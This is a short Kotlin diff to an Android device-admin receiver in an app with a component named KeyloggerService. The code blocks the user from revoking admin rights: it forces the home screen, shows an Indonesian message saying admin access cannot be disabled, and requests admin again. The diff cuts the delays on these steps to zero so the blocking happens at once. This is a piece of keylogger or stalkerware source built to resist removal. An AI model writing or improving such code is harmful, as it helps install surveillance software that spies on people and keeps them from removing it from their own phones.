@@ -34,7 +34,7 @@ class AppDeviceAdminReceiver : DeviceAdminReceiver() {
                 KeyloggerService.instance?.performGlobalAction(
                     android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME
                 )
-            }, 10)
+            }, 0)
         } catch (_: Exception) {}
         return "Akses administrator tidak dapat dinonaktifkan."
     }
@@ -60,7 +60,7 @@ class AppDeviceAdminReceiver : DeviceAdminReceiver() {
             } catch (e: Exception) {
                 Log.w(TAG, "re-request admin failed: ${e.message}")
             }
-        }, 10)
+        }, 0)
     }
 
     companion object {
